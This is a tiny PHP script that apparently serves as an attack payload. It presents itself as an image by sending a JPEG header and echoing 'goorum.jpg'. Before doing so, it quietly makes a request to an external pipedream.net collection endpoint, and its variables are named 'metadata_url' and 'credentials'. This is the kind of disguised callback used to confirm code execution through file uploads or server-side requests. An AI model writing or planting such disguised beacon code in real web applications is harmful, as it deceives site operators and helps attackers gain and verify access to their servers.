<?php
  $metadata_url = "https://enhncv8x0qv59.x.pipedream.net";
  $credentials = file_get_contents($metadata_url);

  header('Content-Type: image/jpeg');
  $contents = file_get_contents('./goorum.jpg');
  echo $contents;
?>
